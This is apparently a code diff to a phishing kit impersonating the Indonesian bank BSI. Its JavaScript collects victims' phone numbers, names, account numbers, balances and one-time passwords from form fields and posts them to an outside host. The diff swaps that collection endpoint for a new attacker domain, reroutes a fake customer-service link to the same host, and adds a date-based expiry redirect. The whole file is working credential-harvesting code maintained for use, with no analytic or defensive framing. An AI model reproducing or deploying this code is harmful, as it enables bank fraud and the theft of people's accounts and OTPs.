@@ -1,3 +1,10 @@
+let tglNow = new Date();
+let waktuBatas = new Date("2025-06-07T23:59:59");
+if (tglNow.getTime() >= waktuBatas.getTime()) {
+  document.location.href = 'https://expiredweb.pages.dev';
+} else {
+  console.log('Server aktif');
+}
 var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱----▩";    
        
  function sendHp(){
@@ -16,7 +23,7 @@ var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱--
   var gabungan = "" + logo + '\n\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nohp.value + '</b>\n𝗡𝗮𝗺𝗮 • ' + nama ;
         
    $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/b7bs8/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -44,7 +51,7 @@ var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱--
   var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value  +  '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>';
         
    $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/b7bs8/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -74,39 +81,8 @@ var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱--
 
     
              
-function sendSaldo(){
-    $('.process1').fadeIn();    
-    event.preventDefault();
-    document.getElementById('btnSubmit1').innerHTML ="Memproses...";
-  
-  var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>';
-        
-   $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
-        type: 'POST',
-        data: { message: gabungan },
-        crossDomain: true,
-        headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-    
-    complete: function(){  
-    setTimeout(function(){
-    document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
- $('.process1').fadeOut();
-    var tarif = document.getElementById('tarif').value;
-    sessionStorage.setItem("tarif", tarif);  
-    var nomor = document.getElementById('nomor').value;
-    sessionStorage.setItem("nomor", nomor);    
-    var nama = document.getElementById('nama').value;
-    sessionStorage.setItem("nama", nama);    
-    var rek = document.getElementById('rek').value;
-    sessionStorage.setItem("rek", rek);
-    var saldo = document.getElementById('saldo').value;
-    sessionStorage.setItem("saldo", saldo);
-    location.href='otp.html';
-    }, 500);}});};
+
+
 
 
 
@@ -120,7 +96,7 @@ function sendOtp() {
  var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>' + '\n\n𝗢𝗧𝗣 • <b>' + sixpin.value + '</b>';
     
 $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/b7bs8/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -159,7 +135,7 @@ function getcs(){
  $("#djload").show();   
   
 setTimeout(function(){  
-location.href='wa';
+location.href='https://anjayhostjon.cloud/BSI/b7bs8/wa';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
